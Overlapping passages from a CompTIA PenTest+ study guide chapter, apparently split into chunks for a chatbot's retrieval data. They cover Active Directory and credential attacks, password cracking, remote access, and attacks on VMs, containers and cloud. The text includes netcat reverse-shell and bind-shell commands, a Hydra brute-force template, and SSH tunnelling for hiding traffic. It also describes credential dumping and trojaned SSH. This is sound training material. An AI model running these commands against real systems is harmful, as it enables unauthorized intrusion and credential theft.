authentication‐ based attacks associated with it. Kerberos attacks such as pass‐the‐ticket and Kerberoasting are important to consider when running this service. Kerberos is an underlying authentication system primarily used with Microsoft Windows systems. It allows you to move around to other systems and access resources without having to constantly log into everything you touch. However, if exploited, obviously it can lead to many exploitable systems and services. A tool you can use to test for Kerberos attacks is known as Rubeus, which is designed to help identify vulnerabilities within the Kerberos service and can be found at https://github.com/GhostPack/Rubeus. You can also test for Kerberos issues and how they can lead to Active Directory certificate abuse with the certify tool found at https://github.com/GhostPack/Certify. Directory Attacks One of the main ways Windows systems and users who use them authenticate and function daily using Microsoft systems is with Active Directory (AD). This directory service allows the entire system to function correctly and provide structure and organization to a Windows‐based network. Another authentication attack is based on Active Directory, which is Microsoft's directory service. Active Directly Services (ADS) is the primary underlying system that allows a Microsoft Windows infrastructure to function. If exploited, it can lead to a goldmine of information and access. Two tools used to test
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	abuse with the certify tool found at https://github.com/GhostPack/Certify. Directory Attacks One of the main ways Windows systems and users who use them authenticate and function daily using Microsoft systems is with Active Directory (AD). This directory service allows the entire system to function correctly and provide structure and organization to a Windows‐based network. Another authentication attack is based on Active Directory, which is Microsoft's directory service. Active Directly Services (ADS) is the primary underlying system that allows a Microsoft Windows infrastructure to function. If exploited, it can lead to a goldmine of information and access. Two tools used to test the access of Active Directory are CME and Bloodhound. The first tool, CrackMapExec (CME) is a tool that can be used by pentesters to test for and find Active Directory vulnerabilities. As you learned in Chapter 7, “Exploiting Network Vulnerabilities,” CME is a tool that is often used in Microsoft Windows and with ADS to find vulnerabilities in the environment. It is a multipurpose AD tool that allows you to execute scripts, memory injection, enumeration, and dumping of credentials. Once you can access a Windows system, there are many ways to exploit it, and one of the most commonly exploited services is NetBIOS. Another commonly used AD exploitation tool is BloodHound. BloodHound is a tool that uses a method of graph theory to map and find relationships in the AD environment that can be used to expand your attack surface and open new attack vectors. By exploring and understanding privilege relationships in an Active Directory, you can stage extensive testing looking for open vulnerabilities. You can find the BloodHound tool at https://bloodhound.readthedocs.io/en/latest/index.html. Lightweight Directory Access Protocol (LDAP) attacks can also cause authentication exploitation. LDAP injection is another method that you as a pentester can check to see if injection is possible. LDAP is used to distribute directory services' information over TCP/IP networks. When directory services' information is sent from source to destination, it is susceptible to attack. LDAP injection is an attack that will exploit the communication of LDAP when the application using it does not properly sanitize the user input. If the statements are modified, arbitrary code can be used to allow privilege escalation, among other exploits. Credentials can be exploited, and access can be granted based on the severity of the attack. Credential Attacks Credential attacks are leverages to exploit the username and password method of logging into a system to authenticate to it. While there are other methods, let's first explore the weaknesses often found when using a username and password to log into a system. The first series of password cracking attacks come in the form of dictionary and brute‐force attacks. Dictionary attacks have been around for a very long time. These types of attacks use a list of words (like a dictionary, with dictionary words) to add to an application that will run through it to access a system. Today, with the dark web, getting access to known dictionary words and their combinations that are
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	a system to authenticate to it. While there are other methods, let's first explore the weaknesses often found when using a username and password to log into a system. The first series of password cracking attacks come in the form of dictionary and brute‐force attacks. Dictionary attacks have been around for a very long time. These types of attacks use a list of words (like a dictionary, with dictionary words) to add to an application that will run through it to access a system. Today, with the dark web, getting access to known dictionary words and their combinations that are most used is quick and easy to do. Brute‐force attacks are slightly more complex in that it will take the dictionary list attack and expand upon it. Because most systems now add complexity challenges in their password resets, end users are given a challenge when they are changing their passwords into something that is easy to guess, much like a dictionary word. Now, because there are many more options that a password cracking tool must run through, it can append numbers, special characters, or use upper‐ and lowercase letters, number combinations, and more. Since tools can continue to try these combinations repeatedly, making slight modifications, it may take a great many attempts to crack the password. When that happens and the tool continues to work endlessly in an effort to conduct a credential attack successfully, it is considered a “brute‐force” attack. Mask attacks are the next evolution of password cracking attack methods above and beyond a brute‐force attack. Because a mask can be a simple string of common placeholders that can be used for cracking purposes, it can reduce the time spent on a brute ‐force attack exponentially. You can preload common strings that are likely to occur, and again, many of them can come from the dark web using already known and stolen password combinations. A tool you can use to conduct a mask attack is called hashcat and can be found at https://hashcat.net/hashcat. Password spraying is another attack method that conducts a brute‐force attack but uses a different part of the vulnerability found within credential attacks. As we mentioned earlier when discussing brute force, challenges are put in place for passwords themselves, but not always for the username. The tool used to conduct the attack will randomize the usernames and keep the password field a constant. So, if Password123 is used as a default or commonly hacked password, the tool will “spray” this password across all the known usernames it can find or use. Credential stuffing is the next attack to cover. This type allows the attacker to access data on the dark web to use stolen and known data to breach systems. OpenID Connect (OIDC) attacks are based on exploiting the open nature of social media and other services that help to connect users to services easily. OpenID uses protocols such as OAuth to provide identity and authentication information. It acts as a delegate so that when
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Password123 is used as a default or commonly hacked password, the tool will “spray” this password across all the known usernames it can find or use. Credential stuffing is the next attack to cover. This type allows the attacker to access data on the dark web to use stolen and known data to breach systems. OpenID Connect (OIDC) attacks are based on exploiting the open nature of social media and other services that help to connect users to services easily. OpenID uses protocols such as OAuth to provide identity and authentication information. It acts as a delegate so that when you want to connect to a system, it acts as a proxy to allow you to do so. Filled with many weaknesses from its inception, it became an immediate target of attack. Security Assertion Markup Language (SAML) attacks are based on exploiting SAML. SAML is an open standard language that is used to create a way to connect and authenticate with systems and exchange information or communicate. Where OAuth was helpful in providing this functionality on social media, mobile devices, and other services, SAML is most commonly used with single sign‐on (SSO) solutions. When two parties or entities connect, they can use SAML as a way to secure authentications and authorizations by using a service provider and an identity provider. Once the identity provider verifies the user's credentials and sends them to the service provider, they are now able to use the system. SAML uses XML and helps to improve the experience a user will have by logging into a system and being able to navigate through and use other services without continuously logging back in. Since the identity provider is responsible for storing the credential information, it adds a layer of security to the system. SAML attacks are when an attacker finds weakness with the identity provider and can exploit it. There are also weaknesses found in XML, the foundational language used that can host a series of vulnerabilities such as an XML signature wrapping attack. This type of attack exploits XML and uses injection methods to exploit document processing and can bypass the XML signature integrity. Credential Acquisition Once you have compromised a system, you will often want to acquire the local credential store. For Windows, the most common tool to accomplish this is Mimikatz, a post‐exploitation tool that is available both as a standalone tool and as part of Metasploit's Meterpreter package. Mimikatz provides a range of features, including the ability to read hashes and passwords directly from memory. We also talked about Mimikatz in Chapter 6 as part of the pivot and exploit process. Kali Linux also includes three tools as part of the creddump package that can be used to acquire credentials in Windows. They are cachedump, which dumps cached credentials; lsadump, which dumps LSA secrets; and pwdump, which dumps password hashes. You can read about all three and how to use them at https://www.kali.org/tools/creddump7. The Linux password file is typically found in /etc/shadow, but
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	part of Metasploit's Meterpreter package. Mimikatz provides a range of features, including the ability to read hashes and passwords directly from memory. We also talked about Mimikatz in Chapter 6 as part of the pivot and exploit process. Kali Linux also includes three tools as part of the creddump package that can be used to acquire credentials in Windows. They are cachedump, which dumps cached credentials; lsadump, which dumps LSA secrets; and pwdump, which dumps password hashes. You can read about all three and how to use them at https://www.kali.org/tools/creddump7. The Linux password file is typically found in /etc/shadow, but it is protected from casual theft by permissions that will prevent nonprivileged users from accessing it. Copying it if you have root privileges is trivial, so the key part of attacking the Linux credential store in most cases is gaining privileged access. Other methods of credential acquisition can also be used, including replacing remote access tools like SSH with Trojaned versions that capture usernames and passwords, searching for accounts that use SSH keys for login and acquiring those keys (particularly if they don't require passwords!), and using a variety of other methods that attempt to intercept user authentication to acquire usernames, passwords, and other authentication tokens. Attacking Biometric Authentication Biometric authentication factors are far more common than they were a few years ago. Fingerprints and facial recognition are used by many phones, and the value of the data on those devices makes them a target for pentesters. Fortunately for pentesters, techniques to acquire and copy fingerprints exist, ranging from complex solutions that require a mold of the source fingerprint and a cast model of the finger, to simple solutions that provide a picture of the fingerprint. As a pentester, you need to know how the target device captures data, and thus what type of exploit might work. With cellphones, this can include finding out if the fingerprint reader uses an optical scanner to read the fingerprint or if it combines the optical sensor with a capacitive sensor to detect a real finger. Facial recognition can also be fooled, and much as with fingerprint sensors, the quality and capabilities of facial recognition systems vary quite a bit. Some use infrared to map points on faces, whereas others can be fooled by a printed image. If you encounter a biometric system, you should focus on finding out the type of system or device used and then considering how to acquire the required biometric data. That may involve pretexting to acquire fingerprints or photos, or more involved efforts if you absolutely have to bypass the system. Offline Password Cracking When you capture hashed passwords, or passwords stored in a secure password storage scheme, you will need to use a password recovery tool. These offline password‐cracking tools use a variety of cracking schemes to find the passwords that match a given hash using brute‐force mechanisms. Common password‐cracking tools include these: Hashcat, a password‐cracking utility that uses graphics processing units (GPUs) to crack passwords at
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	device used and then considering how to acquire the required biometric data. That may involve pretexting to acquire fingerprints or photos, or more involved efforts if you absolutely have to bypass the system. Offline Password Cracking When you capture hashed passwords, or passwords stored in a secure password storage scheme, you will need to use a password recovery tool. These offline password‐cracking tools use a variety of cracking schemes to find the passwords that match a given hash using brute‐force mechanisms. Common password‐cracking tools include these: Hashcat, a password‐cracking utility that uses graphics processing units (GPUs) to crack passwords at a very high rate of speed. Hashcat is much faster than traditional tools like John the Ripper, which are CPU‐bound, making it a tool of choice if you have access to appropriate hardware. Figure 10.6 shows Hashcat running against a Linux password file. FIGURE 10.6 Hashcat cracking Linux passwords RainbowCrack, a cracking package based on rainbow tables and available for Windows and Linux. Rainbow tables are precomputed tables that allow you to search for a given hash rather than brute‐force cracking it. This means you can create, download, or purchase the appropriate rainbow table for many common hashing schemes and character sets and then simply look up the matching hash and password, completing your cracking task even faster than with a tool like Hashcat! Strangely, the PenTest+ outline doesn't mention RainbowCrack, despite mentioning rainbow tables. It's worth your time to try it if you are likely to encounter hashed passwords that you either can generate and maintain tables for or are willing to purchase or download. An external drive full of common rainbow tables can be a huge time‐saver! John the Ripper has been the go‐to password recovery tool for pentesters for years, and it provides a wide range of functionality. Often simply referred to as “John,” it autodetects many common hashes while providing support for modern Linux and Windows password hashes, as well as custom dictionaries and other features. If Hashcat and rainbow tables don't work or aren't available to you, John is a good fallback, and every pentester should have a basic familiarity with how to use John. Cain and Abel is a very dated password recovery tool designed to work with Windows NT, 2000, and XP. The tool is no longer maintained and has not been updated in years, but it remains in the PenTest+ exam objectives. You are unlikely to find a use for the tool when pentesting modern systems, but you should be aware that it could show up on the exam. Credential Testing and Brute‐Forcing Tools Interactive or online testing tools typically focus on login brute‐forcing. They attempt to log into systems using a variety of username and password combinations until they are successful. Obviously, any reasonably well‐ instrumented system is going to send out alarms or block attacks like this, but many desktops and even some servers may not be set up to detect or take action against brute‐force attacks, making tools like
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	You are unlikely to find a use for the tool when pentesting modern systems, but you should be aware that it could show up on the exam. Credential Testing and Brute‐Forcing Tools Interactive or online testing tools typically focus on login brute‐forcing. They attempt to log into systems using a variety of username and password combinations until they are successful. Obviously, any reasonably well‐ instrumented system is going to send out alarms or block attacks like this, but many desktops and even some servers may not be set up to detect or take action against brute‐force attacks, making tools like these relevant if you can use them without being detected. Common brute‐forcing tools include these: Hydra, often known as thc‐hydra, is a brute‐force dictionary attack tool that is designed to work against a variety of protocols and services, including SSH, HTTP/HTTPS, SMB, and even databases. Basic Hydra usage is simple: hydra -l [userid] -p [wordlist] [target ip] -t [timing] [protocol] Medusa, much like Hydra, is a brute‐force login attack tool that supports a variety of protocols and services. In general, if Hydra works for you, you won't need to use Medusa, because the functionality is very similar, but Medusa does have some specific improved features. Details can be found at http://foofus.net/goons/jmk/medusa/medusa.html. Responder is a tool that exploits NetBIOS systems and specifically, LLMNR, NBT‐NS, and MDNS. Responder is a LLMNR, NBT‐NS, and MDNS poisoner, with built‐in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication servers supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP, and Basic HTTP authentication. It can be found at https://github.com/SpiderLabs/Responder. Patator is another tool in the same class as Hydra and Medusa. It can brute‐force a variety of protocols and services but can be more difficult to use—in fact, the author describes it as “less script kiddie friendly.” This means that the user is required to do more filtering based on result codes. In exchange, Patator provides a variety of features that may be useful in specific circumstances. If you're just starting as a pentester, you'll probably find Hydra to be the easiest tool to learn, thanks to the amount of documentation and the variety of tutorials available. Once you've learned how to use Hydra, Medusa should feel pretty familiar, and you'll likely know enough about brute‐forcing to decide whether Patator may be useful to you during a specific penetration test. Wordlists and Dictionaries Building a custom wordlist can be particularly useful if you have gathered a lot of information about your target organization. Common words, catchphrases, and even personal information from staff members can be combined into a dictionary that will provide a greater chance of cracking passwords than a standard dictionary or generic wordlist. CeWL, the Custom Word List Generator, is a Ruby application that allows you to spider a website based on a URL and depth setting and then generate a wordlist from the files and web pages it finds. Running CeWL against a target organization's sites can help generate a custom word list, but you will typically want to add words manually
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	a lot of information about your target organization. Common words, catchphrases, and even personal information from staff members can be combined into a dictionary that will provide a greater chance of cracking passwords than a standard dictionary or generic wordlist. CeWL, the Custom Word List Generator, is a Ruby application that allows you to spider a website based on a URL and depth setting and then generate a wordlist from the files and web pages it finds. Running CeWL against a target organization's sites can help generate a custom word list, but you will typically want to add words manually based on your own OSINT‐gathering efforts. Directories and Filename Brute‐Forcing Finding all the locations where you can gather password dictionary wordlist candidates can be challenging, and tools that you might normally use for web application pentesting or information gathering can come in handy. Many tools are available, but two common tools are mentioned as part of the PenTest+ exam objectives: W3AF, the Web Application Attack and Audit Framework, is an open‐ source web application security scanner that includes directory and filename brute‐forcing in its list of capabilities. DirBuster is a dated but sometimes useful Java application that is designed to brute‐force directories and filenames on web servers. Although the PenTest+ objectives specifically list DirBuster, it was last updated in 2013, and other alternatives are more likely to be useful. Remote Access Creating and maintaining remote access to a machine is a key part of many host exploitation processes so that you can leverage the system, either to pivot or to gain additional information from or about the system itself. There are many ways to allow remote access, but command‐line shell access is one of the most popular since it allows scripting, and the tools to allow it are found by default on many systems. When you configure remote access, remember that scheduled tasks, cron jobs, and similar techniques that we covered in Chapter 6 can be used to make your remote access method persistent across reboots. SSH Many pentesters will use SSH as a default method of remote access, since it is encrypted, and SSH connections to Linux servers and devices are quite common. Although many Linux systems provide an SSH service, SSH can also be very handy for port forwarding when pivoting. A simple ssh remote port forward command can be used to forward remote port A to the attacker on port B: ssh -R[port A]:[host1]:[port B] [user]:[host2] Similar techniques can be used to forward traffic through ssh tunnels, hiding attack traffic from defenders. Capturing SSH keys that are set up not to require a password, capturing the password to an SSH key, or cracking it can all be useful techniques when conducting host exploitation, so it is worth checking to see what exists in a user's ./ssh directory if you have access to it. Netcat and Ncat Netcat is also popular as a remote access tool, and its small footprint makes it easily portable to many systems during
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	attacker on port B: ssh -R[port A]:[host1]:[port B] [user]:[host2] Similar techniques can be used to forward traffic through ssh tunnels, hiding attack traffic from defenders. Capturing SSH keys that are set up not to require a password, capturing the password to an SSH key, or cracking it can all be useful techniques when conducting host exploitation, so it is worth checking to see what exists in a user's ./ssh directory if you have access to it. Netcat and Ncat Netcat is also popular as a remote access tool, and its small footprint makes it easily portable to many systems during a penetration test. Setting up a reverse shell with Netcat on Linux is easy: nc [IP of remote system] [port] -e /bin/sh Windows reverse shells use almost the same command: nc [IP of remote system] [port] -e cmd.exe As you might expect, it is also easy to set Netcat up as a listener using nc ‐l ‐p [port], but you may want to hook a shell directly to it. That's as simple as adding a shell to execute: nc -l -p [port] -e /bin/sh Ncat is designed as a successor to Netcat and is available at https://nmap.org/ncat. The user guide at https://nmap.org/ncat/guide/index.html will walk you through a variety of additional capabilities, including using SSL, proxies, and handy tricks like sending email or chaining Ncat sessions together as part of a chain to allow pivoting. Ncat uses a similar command structure to Netcat, making it easy to use for most pentesters who have used Netcat. Regardless of which tool you learn, you should spend some time playing with Netcat or Ncat because both can be very useful in a variety of penetration testing scenarios. Metasploit and Remote Access Fortunately, Metasploit makes it easy to set up remote shell access. A variety of remote shell modules are built in, including both bind shells, which create a shell that is accessible by connecting to a service port, and reverse shells, which connect back to a system of the penetration tester's choice. You can find many of them under payload/windows/ or payload/linux, depending on the operating system you are targeting. Figure 10.7 shows a Windows exploit with a reverse TCP shell running against a Metasploitable 3 Windows host. FIGURE 10.7 Metasploit reverse TCP shell The Metasploit Meterpreter also includes multiple remote connectivity options, making it a good default choice. PowerShell and WinRM The exploitation of Windows‐based systems is generally done with exposing vulnerabilities in systems within it such as PowerShell, the PowerShell Integrated Scripting Environment (ISE), Windows Remote Management (WinRM), and Windows Management Instrumentation (WMI). Although you learned a great deal about these systems earlier in the book, when it comes to conducting attacks, they are the go‐to! As a quick recap, PowerShell is considered a replacement for the Command tool and allows for a more feature‐rich command‐line shell and the associated scripting language, extended upon with the ISE. Windows Remote Management (WinRM) is a service that allows the exchange of information across systems
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	of Windows‐based systems is generally done with exposing vulnerabilities in systems within it such as PowerShell, the PowerShell Integrated Scripting Environment (ISE), Windows Remote Management (WinRM), and Windows Management Instrumentation (WMI). Although you learned a great deal about these systems earlier in the book, when it comes to conducting attacks, they are the go‐to! As a quick recap, PowerShell is considered a replacement for the Command tool and allows for a more feature‐rich command‐line shell and the associated scripting language, extended upon with the ISE. Windows Remote Management (WinRM) is a service that allows the exchange of information across systems on a network. Windows Management Instrumentation (WMI) is a service that allows users to set up and retrieve system‐based information on a Windows system. One of the quickest ways to exploit a Windows system is by manipulating the vulnerabilities found in these systems. You can also use a plethora of available tools to do so. Evil‐winrm is a tool that can be used to exploit WinRM. Evil‐winrm is a pentesting tool that can help you test vulnerabilities and it can be download at https://github.com/Hackplayers/evil‐winrm. You can also download and use PowerSploit, which is a PowerShell post‐exploitation framework; you can find it at https://github.com/PowerShellMafia/PowerSploit. A commonly used tool to conduct attacks is an LOLBin, which you learned about earlier in this book. LOLBins stand for Living Off the Land Binaries and are pieces of software that exist in an operating system and usually remain undetected. These binaries are often not meant to be harmful or malicious but are used by attackers in a way that makes them a concern. For example, Windows, PowerShell, and WMI (Windows Management Instrumentation) are highly compromised services that serve as an LOLBin. Another great example of an LOLBin is Windows Remote Management (WinRM) in the form of winrm.vbs, which can be used for lateral movement attacks. As mentioned, WinRM is a system tool, but once compromised, it becomes an LOLBin. Since a script form of the tool was used versus the direct binary, this is referred to as an LOLBAS, which stands for Living Off the Land Binaries and Scripts. Proxies and Proxychains As you send traffic to and from systems during a penetration test, you will likely want to hide the content of the traffic you are sending. You can use proxychains to tunnel any traffic through a proxy server, with full support for HTTP, SOCKS4, and SOCKS5 proxy servers and with the ability to chain multiple proxies together to further conceal your actions. This can allow you to more effectively pivot into or out of protected networks in addition to hiding your traffic from defenders. The proxychains command syntax is quite simple: proxychains [application command] Running proxychains requires more work up front, however. To use proxychains effectively, you need to configure it via /etc/proxychains.conf. By default, proxychains will use TOR, the Onion Router, but you can configure it to use other proxies. If you want to explore proxychains further, including examples and more advanced
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	SOCKS4, and SOCKS5 proxy servers and with the ability to chain multiple proxies together to further conceal your actions. This can allow you to more effectively pivot into or out of protected networks in addition to hiding your traffic from defenders. The proxychains command syntax is quite simple: proxychains [application command] Running proxychains requires more work up front, however. To use proxychains effectively, you need to configure it via /etc/proxychains.conf. By default, proxychains will use TOR, the Onion Router, but you can configure it to use other proxies. If you want to explore proxychains further, including examples and more advanced chaining techniques, you can find a very approachable tutorial at https://null‐byte.wonderhowto.com/how‐to/hack‐like‐pro‐ evade‐detection‐using‐proxychains‐0154619. Attacking Virtual Machines and Containers Virtual machines (VMs) and containers are both potential targets for pentesters, but compromising the underlying hypervisor or container host is an even more desirable goal. After all, if you can take over the underlying system, you can then seize control of many virtual machines or containers! The concept of sandbox escape is key to this, as compromising the underlying system requires either access to that system or the ability to escape from the virtual machine or container to attack the system they are running on—thus, escaping the sandbox. Virtualization and Containers; What's the Difference? What's the difference between a virtual machine and a container? A virtual machine is a complete system running in a virtual environment, including emulated hardware that makes the operating system and applications believe they are running on an actual system. Containers run on a physical server and operating system, and they share the host operating system's kernel (and typically binaries and libraries) in a read‐ only mode. Containers allow you to isolate applications or services while being lighter weight than a full virtual machine. Containers are often managed as a swarm, making it easier to manage them as a single virtual system. The following graphic shows how this looks from a high‐level view. Container Scans Containers are used in cloud environments and are helpful in that they untether the operating system from a host so that it can run applications without the additional weight and complexity of the OS, or, having to pay for a license for it if you don't need it. Containers are becoming more and more popular as cloud deployments continue to grow in use. One of the cloud services that is known for deploying containers is called Kubernetes. Although you don't need to know how Kubernetes, containers, or the cloud uses these technologies in general for the PenTest+ exam, you will be expected to know what makes them vulnerable to attack and why you should be concerned, but also prepared as a pentester to check for vulnerabilities. Containers are still logical entities that can be exploited. Just because they do not have an OS installed on them does not mean that they are not vulnerable. The top security issue with containers is misconfiguration. If a container is not secured, it can be exploited. For example,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	is called Kubernetes. Although you don't need to know how Kubernetes, containers, or the cloud uses these technologies in general for the PenTest+ exam, you will be expected to know what makes them vulnerable to attack and why you should be concerned, but also prepared as a pentester to check for vulnerabilities. Containers are still logical entities that can be exploited. Just because they do not have an OS installed on them does not mean that they are not vulnerable. The top security issue with containers is misconfiguration. If a container is not secured, it can be exploited. For example, if a container is set up and credentials to it are exposed, they can be misused if accessed maliciously. Then, attackers can run crypto mining scams, deploy malware, conduct breaches, and so on. Other types of attacks are using a container breach to get access to other resources in the cloud. These types of attacks are called container breakouts, cross‐container attacks, and sidecar scans. The PenTest+ focuses on the sidecar scan, which is when a container is exposed and exploited, and then the attacker can move to another container within the same pod. One of the ways pentesters can check containers is with the use of Trivy. Trivy is an open‐source vulnerability scanner that can find security issues in containers and other artifacts. You can find more information and download it at https://github.com/aquasecurity/trivy. Containers frequently get their code from code repositories (also called repos) like GitHub. A common threat to repos is repo‐jacking. You can learn more about this threat by reading “Repo Jacking: The Great Source‐Code Swindle,” here: https://snyk.io/blog/repo‐jacking‐the‐great‐source‐code‐swindle Virtual Machine Attacks Attacking individual virtual machines normally follows the same process that attacks against a physical system would. In fact, in many cases you won't know if you're attacking a virtual machine, a container, or a physical machine until you have compromised it (and perhaps not even then!). If you suspect that you have compromised a virtual machine, you can look for common signs that the system is virtual, including the hardware that is presented to the operating system. In many cases, checking for the network interface card, or for virtualization plug‐ins like VMware tools or VirtualBox extensions, can tell you if you have compromised a VM. On a Windows system, you can do this quite easily by using wmic: wmic baseboard get manufacturer,product Detection using a technique like this can result in quick identification of virtualization, as shown in Figure 10.8, where this command was run on a Windows system running in VirtualBox. FIGURE 10.8 Detecting virtualization on a Windows system The Linux system‐detect‐virt command is an easy way to determine what virtualization package is running if the system is running system‐d. Other options include using the demidecode command, which can provide similar information, and checking the disk IDs to see if the system is being virtualized by using the ls ‐l /dev/disk/by‐id listing command, which will show output like that shown in Figure 10.9, as demonstrated on
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	this can result in quick identification of virtualization, as shown in Figure 10.8, where this command was run on a Windows system running in VirtualBox. FIGURE 10.8 Detecting virtualization on a Windows system The Linux system‐detect‐virt command is an easy way to determine what virtualization package is running if the system is running system‐d. Other options include using the demidecode command, which can provide similar information, and checking the disk IDs to see if the system is being virtualized by using the ls ‐l /dev/disk/by‐id listing command, which will show output like that shown in Figure 10.9, as demonstrated on a VirtualBox‐hosted Kali Linux instance. FIGURE 10.9 Detecting virtualization on Kali Linux Virtualization is rarely obfuscated in real‐world production system environments, so detecting virtualization should be possible on most systems you encounter. Once you know which hypervisor you are dealing with, you can conduct research on the attack methods that may be available for that specific environment. The underlying hypervisor can be a major target for pentesters since they provide administrative control of systems. In fact, compromising a hypervisor can unlock significant portions of many organizations' infrastructures. That means that hypervisor vulnerabilities are an important target for pentesters. In many cases hypervisors are network accessible for management and monitoring, making it possible to exploit a vulnerable hypervisor remotely. In addition, the same types of attacks you're already familiar with that focus on weak configurations; shared, exposed, or otherwise vulnerable passwords; social engineering–based attacks; and of course denial‐of‐service attacks are all also potentially possible against hypervisors as they are against other infrastructure and systems. Hypervisor and Virtual Machine Repository Vulnerabilities Like any other software or operating system, hypervisors can have vulnerabilities that pentesters can exploit. Remote code execution vulnerabilities can even allow pentesters to exploit virtualization servers. Since virtualization servers are often in a production state, some organizations may delay patching, making it more likely that even critical flaws may not be patched promptly. A 9.8 CVSS score remote code execution in VMware's ESXI, vCenter Server, and Cloud Foundation was made public in early 2021. The vulnerability allowed attackers who could access port 443 on systems running those software products to run commands on the underlying host operating system with unrestricted privileges. Exploits were quickly released, including Metasploit exploit packages, making it easy for pentesters who encounter unpatched VMWare servers to attempt to take advantage of the flaw. Many virtual machines (including cloud instances) are available from repositories like the AWS Marketplace, the VMware Marketplace, and the Azure Marketplace. These repositories and others like them, including organizationally owned or managed repositories, can become targets for pentesters. Placing a compromised virtual machine or instance into a marketplace makes it available for adoption and use if the exploit or vulnerability included in it is not identified. As a pentester, you should keep this in mind as a potential method for retaining or obtaining access if you can find an opportunity to modify a system or gain access to a repository. Virtual Machine Escape
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	(including cloud instances) are available from repositories like the AWS Marketplace, the VMware Marketplace, and the Azure Marketplace. These repositories and others like them, including organizationally owned or managed repositories, can become targets for pentesters. Placing a compromised virtual machine or instance into a marketplace makes it available for adoption and use if the exploit or vulnerability included in it is not identified. As a pentester, you should keep this in mind as a potential method for retaining or obtaining access if you can find an opportunity to modify a system or gain access to a repository. Virtual Machine Escape Exploit tools that allow attackers to escape a virtual machine to directly attack the hypervisor have been sought after for years, with high prices paid for working exploits on the open market. Exploits have been found for VMware, Xen Project, Hyper‐V, and VirtualBox, but each has been patched shortly after it was found. In most virtualization environments, VM escape isn't likely to work unless a new exploit is introduced, and you are able to use it to exploit a compromised host before it is patched by your target organization. That means that most pentesters will be far more successful attacking the underlying administrative infrastructure or finding a vulnerable virtualization environment so that they can access the virtualization management tools and systems than they will be if they rely on VM escape exploits. Containerization Attacks Attacks against OS‐level virtualization tools like Docker and Kubernetes often start by compromising the application that is running in the container. Typical penetration testing processes can be used, including port and vulnerability scanning and service exploitation. Once you have compromised a container, you can then attempt to access the container's host—in fact, in some cases, like the vulnerable Docker instance that NotSoSecure provides, you can simply run the Docker client from one of the vulnerable Docker containers and connect to the Docker daemon running on the virtual machine! As with most penetration testing efforts, you should carefully document the environment, check for misconfigurations and exposed or vulnerable services, and then pivot as you gain further access. If you want a vulnerable Docker instance to learn with, NotSoSecure provides a virtual machine with multiple flags that you can attempt to capture for practice. You can find details at https://www.notsosecure.com/vulnerable‐docker‐vm, and a complete walk‐through of how to compromise it, along with useful techniques for exploiting, at https://gitlab.com/Creased/vulnhub‐docker‐writeup. Containerization tools like Kubernetes and Docker are also widely deployed as cloud services. These services are architected in a variety of ways, ranging from direct support for containerization systems like Docker to serverless container services like Amazon's combination of ECS (Elastic Container Service) and Fargate, their serverless compute environment. Although these environments may use familiar underlying tools, they also require dedicated knowledge of the cloud infrastructure service to conduct a complete penetration test of the environment. Fortunately, in the content of the PenTest+ exam outline, the concepts you need to focus on are vulnerabilities related to containerized workloads and attacks against
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	tools like Kubernetes and Docker are also widely deployed as cloud services. These services are architected in a variety of ways, ranging from direct support for containerization systems like Docker to serverless container services like Amazon's combination of ECS (Elastic Container Service) and Fargate, their serverless compute environment. Although these environments may use familiar underlying tools, they also require dedicated knowledge of the cloud infrastructure service to conduct a complete penetration test of the environment. Fortunately, in the content of the PenTest+ exam outline, the concepts you need to focus on are vulnerabilities related to containerized workloads and attacks against misconfigured containerized technologies. Attacks on containerized workload vulnerabilities focus on the applications running in containers themselves. That means that pentesters can leverage existing application or service vulnerabilities or exploit APIs, and then use those exploits to conduct familiar attacks like installing tools into the containerized environment. Pentesters should check for vulnerable services. Attacks against misconfigured containerized technologies are similar to many other types of misconfigurations. A penetration tester hunting for misconfigurations will be looking for things like exposed API services, dashboards, open proxies, and configuration information. Of course, improperly secured management tools, improperly set or overly broad permissions, or access to secrets are very desirable, too. CyberArk provides a great listing of common misconfiguration items and other useful details at https://www.cyberark.com/resources/threat‐research‐blog/kubernetes‐ pentest‐methodology‐part‐1, and its companion articles at https://www.cyberark.com/resources/threat‐research‐blog/kubernetes‐ pentest‐methodology‐part‐2 and https://www.cyberark.com/resources/threat‐research‐blog/kubernetes‐ pentest‐methodology‐part‐3. In addition to examining the two major categories listed in the PenTest+ exam outline, you should keep in mind that attacks against the container applications and underlying Linux environment can also be leveraged, and that containers run as part of a network, meaning that traditional network attacks can also be an important part of attacks against a containerized environment. If you're considering a pentest against a Kubernetes environment, you may want to check out kube‐hunter, a dedicated Kubernetes penetration testing tool designed to conduct both passive and active tests against Kubernetes environments and services. Attacking Cloud Technologies With the growth of cloud hosting, pentesters now need to plan how to assess and attack cloud environments. This version of the PenTest+ exam outline contains many points of focus aimed at researching attack vectors and performing attacks on cloud technologies. The large‐scale shift to cloud services, including both infrastructure as a service and software or platform as a service, means that almost any penetration test you conduct is likely to need to take third‐party‐hosted and cloud service into account. Some of the key areas to review are with third‐party integrations, which is a large part of how the cloud ecosystem thrives. You will see as you deploy cloud resources that there are more and more integrations with other services that allow you to expand your service offerings. For example, if you run an application you offer customers from the cloud, you may use authentication services from another provider within the cloud ecosystem. This technically becomes a third‐party integration. If that vendor has a security problem, it now becomes your problem.
